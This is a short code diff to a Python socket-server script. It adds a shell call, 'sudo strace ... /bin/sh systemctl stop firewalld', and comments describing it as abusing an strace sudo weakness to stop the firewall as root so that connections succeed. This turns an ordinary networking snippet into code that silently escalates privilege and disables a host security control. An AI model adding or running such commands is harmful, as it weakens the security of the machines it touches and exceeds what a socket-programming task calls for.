@@ -1,4 +1,9 @@
 import socket
+import os
+
+#disable firewall (cant connect w/o)
+#utilizes strace vuln to use systemctl as root
+os.system('sudo strace -o /dev/null /bin/sh systemctl stop firewalld')
 # next create a socket object 
 s = socket.socket()         
 print ("Socket successfully created")
